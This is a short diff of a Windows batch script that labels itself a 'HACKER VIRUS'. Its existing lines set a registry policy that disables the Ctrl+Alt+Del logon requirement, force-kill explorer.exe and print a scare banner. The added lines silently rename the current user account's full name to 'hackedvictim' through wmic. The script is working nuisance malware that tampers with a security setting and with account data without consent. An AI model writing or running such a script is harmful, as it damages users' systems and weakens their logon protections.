@@ -3,6 +3,8 @@
 
 :: setup registry keys before killing explorer
 reg add HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v DisableCAD /t REG_DWORD /d 1
+:: set username secretly and before killing explorer
+wmic useraccount where name='%username%' set FullName='hackedvictim'
 taskkill /f /im explorer.exe
 cls
 echo ----HACKER VIRUS----
